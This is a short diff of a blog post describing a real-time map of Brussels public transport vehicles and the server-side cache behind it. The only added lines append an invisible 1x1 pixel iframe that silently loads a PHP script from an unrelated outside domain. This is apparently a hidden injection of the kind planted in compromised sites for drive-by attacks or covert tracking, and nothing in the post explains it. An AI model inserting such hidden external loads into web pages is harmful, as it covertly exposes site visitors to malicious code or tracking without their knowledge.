@@ -10,3 +10,5 @@ A couple of days ago, the public transportation company of Brussels (<a href='ht
 It shows the real time location of the surface & underground vehicles, updated every three minutes.
 
 Technically, the data is hosted on a public web hosting, which cannot get periodical updates over the network (using 'cron' & 'curl'). We then implemented a small cache mechanism: at each query of the data by the webpages, the script on the server checks if the data is enough up to date. If not, the new data the server retrieves the data from the STIB-MIVB portal.
+
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
